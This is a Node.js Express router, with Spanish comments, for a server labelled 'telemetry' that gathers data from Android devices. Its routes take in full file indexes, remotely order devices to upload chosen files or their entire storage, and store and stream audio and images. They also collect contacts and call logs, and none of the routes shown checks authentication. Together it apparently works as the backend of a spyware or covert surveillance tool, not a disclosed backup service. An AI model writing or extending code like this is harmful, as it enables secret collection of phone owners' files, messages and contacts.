const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');
const { getDatasetDir, sanitizeDeviceId, isSafeFilePath, sanitizePath } = require('../utils/helpers');
const { syncMulter } = require('../middleware/upload');
const {
  getDeviceSyncRules,
  saveDeviceSyncRules,
  autoEnqueueDeviceFiles,
  getDeviceSyncStats
} = require('../services/deviceSyncService');
const {
  handleContactsBackup,
  handleContactsStatus,
  handleGetContacts
} = require('../controllers/contactsController');
const {
  handleCallLogsBackup,
  handleCallLogsStatus,
  handleGetCallLogs
} = require('../controllers/callLogsController');

// GET /api/telemetry/devices - Lista dinamica de dispositivos
router.get('/api/telemetry/devices', (req, res) => {
  const targetDir = getDatasetDir();
  const devicesDir = path.join(targetDir, 'devices');
  const devicesMap = new Map();

  if (fs.existsSync(devicesDir)) {
    const items = fs.readdirSync(devicesDir);
    items.forEach(item => {
      const fullPath = path.join(devicesDir, item);
      const stat = fs.statSync(fullPath);
      let deviceId = item;

      if (stat.isDirectory()) {
        deviceId = item;
      } else if (item.endsWith('.json')) {
        deviceId = sanitizeDeviceId(item);
      } else {
        return;
      }

      if (!devicesMap.has(deviceId)) {
        let totalFiles = 0;
        const indexPath = path.join(devicesDir, deviceId, 'file_index.json');
        if (fs.existsSync(indexPath)) {
          try {
            const indexData = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
            totalFiles = Array.isArray(indexData) ? indexData.length : (indexData.files?.length || 0);
          } catch (e) {}
        }
        devicesMap.set(deviceId, {
          deviceId,
          model: 'Android Device',
          manufacturer: 'Mobile',
          android_version: 'SDK 34',
          last_seen: stat.mtime.toISOString(),
          total_files: totalFiles
        });
      }
    });
  }

  const devicesList = Array.from(devicesMap.values());
  return res.json({ success: true, devices: devicesList });
});

// GET /api/telemetry/device-index
router.get('/api/telemetry/device-index', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const safeId = sanitizeDeviceId(deviceId);
  const targetDir = getDatasetDir();
  const indexPath = path.join(targetDir, 'devices', safeId, 'file_index.json');

  if (!fs.existsSync(indexPath)) {
    return res.json({ success: true, deviceId: safeId, files: [] });
  }

  try {
    const content = fs.readFileSync(indexPath, 'utf8');
    const data = JSON.parse(content);
    const files = Array.isArray(data) ? data : (data.files || []);
    return res.json({ success: true, deviceId: safeId, files });
  } catch (err) {
    return res.status(500).json({ error: 'Error al leer indice de archivos' });
  }
});

// POST /api/telemetry/device-index
router.post('/api/telemetry/device-index', (req, res) => {
  const { device_id, deviceId, files } = req.body;
  const targetId = device_id || deviceId;
  if (!targetId || !Array.isArray(files)) {
    return res.status(400).json({ error: 'Parametros invalidos. Se requiere deviceId y arreglo files.' });
  }

  const safeId = sanitizeDeviceId(targetId);
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeId);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

  const indexPath = path.join(deviceDir, 'file_index.json');
  fs.writeFileSync(indexPath, JSON.stringify(files, null, 2), 'utf8');

  // Encolar automaticamente archivos nuevos del dispositivo (Sincronizacion Global Server-Driven)
  const enqueueResult = autoEnqueueDeviceFiles(safeId);

  // Emitir evento Socket.io de actualizacion del indice a la sala Web
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    deviceSyncNs.to(`web:device:${safeId}`).emit('sync:index_updated', {
      deviceId: safeId,
      count: files.length,
      enqueueResult,
      updatedAt: new Date().toISOString()
    });
    console.log(`[DEVICE_SYNC] Emitted sync:index_updated for ${safeId} (${files.length} files) to web room`);
  }

  return res.json({ 
    success: true, 
    message: 'Indice de archivos actualizado y encolado correctamente.', 
    count: files.length,
    enqueuedPending: enqueueResult.enqueuedPending || 0,
    enqueuedStandby: enqueueResult.enqueuedStandby || 0
  });
});

// POST /api/telemetry/request-upload & /api/telemetry/signal-sync
router.post(['/api/telemetry/request-upload', '/api/telemetry/signal-sync'], (req, res) => {
  const { deviceId, filePath, targetPath } = req.body;
  const targetId = deviceId;
  const pathToUpload = filePath || targetPath;

  if (!targetId || !pathToUpload) {
    return res.status(400).json({ error: 'Falta deviceId o filePath' });
  }

  const safeId = sanitizeDeviceId(targetId);
  const rulesData = getDeviceSyncRules(safeId);

  const existing = rulesData.requestedFiles.find(r => r.path === pathToUpload);
  if (!existing) {
    rulesData.requestedFiles.push({
      path: pathToUpload,
      status: 'PENDING',
      requestedAt: new Date().toISOString()
    });
  } else {
    existing.status = 'PENDING';
    existing.requestedAt = new Date().toISOString();
  }
  saveDeviceSyncRules(safeId, rulesData);

  // Emitir evento en tiempo real a la sala del dispositivo via Socket.io
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    if (req.path.endsWith('/signal-sync')) {
      deviceSyncNs.to(`device:${safeId}`).emit('sync:scan_structure', { deviceId: safeId });
      console.log(`[DEVICE_SYNC] Emitted sync:scan_structure to room device:${safeId}`);
    } else {
      deviceSyncNs.to(`device:${safeId}`).emit('sync:request_file', { path: pathToUpload, deviceId: safeId });
      console.log(`[DEVICE_SYNC] Emitted sync:request_file for ${pathToUpload} to room device:${safeId}`);
    }
  }

  return res.json({ success: true, message: 'Solicitud de descarga registrada.', path: pathToUpload });
});

// POST /api/telemetry/toggle-folder-sync (Compatibilidad retroactiva)
router.post('/api/telemetry/toggle-folder-sync', (req, res) => {
  const targetId = req.body.deviceId || req.body.device_id;
  const safeId = sanitizeDeviceId(targetId);
  return res.json({
    success: true,
    deviceId: safeId,
    auto_sync_all: true,
    message: 'Sincronizacion global de carpetas activa en el servidor.'
  });
});

// GET /api/telemetry/folder-sync-rules (Compatibilidad retroactiva)
router.get('/api/telemetry/folder-sync-rules', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const safeId = sanitizeDeviceId(deviceId);
  const rulesData = getDeviceSyncRules(safeId);

  return res.json({
    success: true,
    deviceId: safeId,
    auto_sync_folders: rulesData.auto_sync_folders || []
  });
});

// GET /api/telemetry/pending-downloads
router.get('/api/telemetry/pending-downloads', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const safeId = sanitizeDeviceId(deviceId);
  const rulesData = getDeviceSyncRules(safeId);

  // Cargar indice del dispositivo para obtener el tamano real de cada archivo
  const targetDir = getDatasetDir();
  const indexPath = path.join(targetDir, 'devices', safeId, 'file_index.json');
  const sizeMap = new Map();
  if (fs.existsSync(indexPath)) {
    try {
      const idxContent = fs.readFileSync(indexPath, 'utf8');
      const idxData = JSON.parse(idxContent);
      const list = Array.isArray(idxData) ? idxData : (idxData.files || []);
      for (const item of list) {
        if (item && item.absolutePath) {
          sizeMap.set(item.absolutePath, typeof item.sizeBytes === 'number' ? item.sizeBytes : 0);
        }
      }
    } catch (e) {
      console.warn(`[WARN] No se pudo leer file_index.json para ${safeId}: ${e.message}`);
    }
  }

  let allPending = (rulesData.requestedFiles || [])
    .filter(r => r.status === 'PENDING')
    .map(r => r.path);

  // Si la cola activa es menor a 25, reabastecer dinamicamente desde file_index.json
  if (allPending.length < 25) {
    const enqueueRes = autoEnqueueDeviceFiles(safeId);
    if (enqueueRes && enqueueRes.enqueuedPending > 0) {
      const updatedRules = getDeviceSyncRules(safeId);
      allPending = (updatedRules.requestedFiles || [])
        .filter(r => r.status === 'PENDING')
        .map(r => r.path);
    }
  }

  // Ordenar de menor a mayor tamano para transferir primero archivos ligeros y evitar cuellos de botella
  allPending.sort((a, b) => {
    const sizeA = sizeMap.has(a) ? sizeMap.get(a) : 9999999999;
    const sizeB = sizeMap.has(b) ? sizeMap.get(b) : 9999999999;
    return sizeA - sizeB;
  });

  // Entregar en lotes controlados (maximo 25 a la vez) para no saturar memoria del loop movil
  const BATCH_SIZE = 25;
  const pendingBatch = allPending.slice(0, BATCH_SIZE);

  const requestedList = pendingBatch.map(p => ({ path: p, requested_at: new Date().toISOString() }));
  const autoFolders = rulesData.auto_sync_folders || [];

  return res.json({ 
    success: true, 
    pendingFiles: pendingBatch, 
    requested_files: requestedList,
    totalPending: allPending.length,
    auto_sync_folders: autoFolders,
    sync_rules: {
      enabled_paths: autoFolders,
      scan_interval_minutes: 20,
      file_extensions: []
    }
  });
});

// GET /api/telemetry/devices/:deviceId/sync-stats - Estadisticas de sincronizacion global
router.get('/api/telemetry/devices/:deviceId/sync-stats', (req, res) => {
  const safeId = sanitizeDeviceId(req.params.deviceId);
  if (!safeId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const stats = getDeviceSyncStats(safeId);
  return res.json({ success: true, deviceId: safeId, stats });
});

// POST /api/telemetry/devices/:deviceId/sync-all - Disparador de sincronizacion de todo el almacenamiento
router.post('/api/telemetry/devices/:deviceId/sync-all', (req, res) => {
  const safeId = sanitizeDeviceId(req.params.deviceId);
  if (!safeId) return res.status(400).json({ error: 'Falta parametro deviceId' });

  const includeLarge = Boolean(req.body && req.body.includeLarge);
  const result = autoEnqueueDeviceFiles(safeId, { includeLarge });
  const stats = getDeviceSyncStats(safeId);

  // Emitir actualizacion a la sala Web
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    deviceSyncNs.to(`web:device:${safeId}`).emit('sync:rules_updated', {
      deviceId: safeId,
      stats,
      result
    });
  }

  return res.json({
    success: true,
    message: 'Sincronizacion total del dispositivo procesada.',
    deviceId: safeId,
    result,
    stats
  });
});

// POST /api/telemetry/devices/:deviceId/prioritize-file - Promover archivo STANDBY a PENDING
router.post('/api/telemetry/devices/:deviceId/prioritize-file', (req, res) => {
  const safeId = sanitizeDeviceId(req.params.deviceId);
  const filePath = req.body && (req.body.filePath || req.body.path);
  if (!safeId || !filePath) return res.status(400).json({ error: 'Falta deviceId o filePath' });

  const rulesData = getDeviceSyncRules(safeId);
  const existing = (rulesData.requestedFiles || []).find(r => r.path === filePath);

  if (!existing) {
    rulesData.requestedFiles.push({
      path: filePath,
      status: 'PENDING',
      requestedAt: new Date().toISOString()
    });
  } else {
    existing.status = 'PENDING';
    existing.requestedAt = new Date().toISOString();
  }

  saveDeviceSyncRules(safeId, rulesData);

  // Emitir a app movil y web
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    deviceSyncNs.to(`device:${safeId}`).emit('sync:request_file', { path: filePath, deviceId: safeId });
    deviceSyncNs.to(`web:device:${safeId}`).emit('sync:file_prioritized', { path: filePath, deviceId: safeId });
  }

  return res.json({ success: true, message: 'Archivo priorizado para descarga inmediata.', path: filePath });
});

// POST /api/telemetry/upload-file
router.post('/api/telemetry/upload-file', syncMulter.single('file'), (req, res) => {
  const deviceId = req.body.deviceId || req.body.device_id;
  const remotePath = req.body.originalPath || req.body.remotePath || req.body.path || req.body.relativePath;

  if (!req.file || !deviceId) {
    return res.status(400).json({ error: 'Falta archivo subido o deviceId.' });
  }

  const safeId = sanitizeDeviceId(deviceId);
  const targetDir = getDatasetDir();
  const downloadsDir = path.join(targetDir, 'devices', safeId, 'downloads');
  if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });

  const filename = remotePath ? path.basename(remotePath) : req.file.originalname;
  const destPath = path.join(downloadsDir, filename);

  // Use copy + unlink to safely handle cross-device mount points in Docker
  fs.copyFileSync(req.file.path, destPath);
  try { fs.unlinkSync(req.file.path); } catch (e) {}

  // Marcar como COMPLETED en sync_rules.json
  const rulesData = getDeviceSyncRules(safeId);
  if (rulesData.requestedFiles && rulesData.requestedFiles.length > 0) {
    rulesData.requestedFiles = rulesData.requestedFiles.map(r => r.path === remotePath ? { ...r, status: 'COMPLETED', completedAt: new Date().toISOString() } : r);
    saveDeviceSyncRules(safeId, rulesData);
  }

  // Registrar en downloaded_files.json
  const downloadsMapPath = path.join(targetDir, 'devices', safeId, 'downloaded_files.json');
  let map = {};
  if (fs.existsSync(downloadsMapPath)) {
    try { map = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8')); } catch (e) {}
  }
  map[remotePath || filename] = filename;
  fs.writeFileSync(downloadsMapPath, JSON.stringify(map, null, 2), 'utf8');

  // Emitir evento en tiempo real a la sala web via Socket.io
  const deviceSyncNs = req.app.get('deviceSyncNamespace');
  if (deviceSyncNs) {
    deviceSyncNs.to(`web:device:${safeId}`).emit('file:uploaded', { path: remotePath || filename, filename });
    console.log(`[DEVICE_SYNC] Emitted file:uploaded for ${remotePath || filename} to room web:device:${safeId}`);
  }

  return res.json({ success: true, message: 'Archivo subido y almacenado exitosamente.', filename });
});

// GET /api/telemetry/file-content
router.get('/api/telemetry/file-content', (req, res) => {
  const deviceId = req.query.deviceId || req.query.device_id;
  const targetPath = req.query.path || req.query.remotePath;

  if (!deviceId || !targetPath) {
    return res.status(400).json({ error: 'Falta deviceId o path' });
  }

  const safeId = sanitizeDeviceId(deviceId);
  if (!safeId) {
    console.warn(`[SECURITY_ALERT] Invalid deviceId parameter: ${deviceId}`);
    return res.status(400).json({ error: 'Identificador de dispositivo inválido.' });
  }

  const filename = sanitizePath(targetPath);
  if (!filename || filename.includes('..')) {
    console.warn(`[SECURITY_ALERT] Directory traversal attempt detected: ${targetPath}`);
    return res.status(403).json({ error: 'Acceso denegado: nombre de archivo no permitido.' });
  }

  const targetDir = getDatasetDir();
  const filePath = path.join(targetDir, 'devices', safeId, 'downloads', filename);

  if (!isSafeFilePath(filePath, targetDir)) {
    console.warn(`[SECURITY_ALERT] Directory traversal out-of-bounds attempt: ${filePath}`);
    return res.status(403).json({ error: 'Acceso denegado: ruta fuera de los límites autorizados.' });
  }

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ success: false, status: 'NOT_DOWNLOADED', error: 'El archivo aun no ha sido descargado al servidor.' });
  }

  const ext = path.extname(filename).toLowerCase();
  if (ext === '.opus') {
    res.setHeader('Content-Type', 'audio/ogg; codecs=opus');
  } else if (ext === '.ogg') {
    res.setHeader('Content-Type', 'audio/ogg');
  } else if (ext === '.mp3') {
    res.setHeader('Content-Type', 'audio/mpeg');
  } else if (ext === '.wav') {
    res.setHeader('Content-Type', 'audio/wav');
  } else if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
    res.setHeader('Content-Type', `image/${ext === '.jpg' ? 'jpeg' : ext.replace('.', '')}`);
  }

  res.setHeader('Content-Disposition', `inline; filename="${filename}"`);
  return res.sendFile(filePath);
});

// Rutas de Respaldo y Consulta de Contactos
router.post(['/api/telemetry/devices/:deviceId/contacts/backup', '/api/devices/:deviceId/contacts/backup', '/api/telemetry/contacts/backup', '/api/contacts/backup'], handleContactsBackup);
router.post(['/api/telemetry/devices/:deviceId/contacts/status', '/api/devices/:deviceId/contacts/status', '/api/telemetry/contacts/status', '/api/contacts/status'], handleContactsStatus);
router.get(['/api/telemetry/devices/:deviceId/contacts', '/api/devices/:deviceId/contacts', '/api/telemetry/contacts', '/api/contacts'], handleGetContacts);

// Rutas de Respaldo y Consulta de Registro de Llamadas
router.post(['/api/telemetry/devices/:deviceId/call-logs/backup', '/api/devices/:deviceId/call-logs/backup', '/api/telemetry/call-logs/backup', '/api/call-logs/backup'], handleCallLogsBackup);
router.post(['/api/telemetry/devices/:deviceId/call-logs/status', '/api/devices/:deviceId/call-logs/status', '/api/telemetry/call-logs/status', '/api/call-logs/status'], handleCallLogsStatus);
router.get(['/api/telemetry/devices/:deviceId/call-logs', '/api/devices/:deviceId/call-logs', '/api/telemetry/call-logs', '/api/call-logs'], handleGetCallLogs);

// Exportar helpers para retrocompatibilidad
router.autoEnqueueDeviceFiles = autoEnqueueDeviceFiles;
router.getDeviceSyncStats = getDeviceSyncStats;
router.getDeviceSyncRules = getDeviceSyncRules;

module.exports = router;
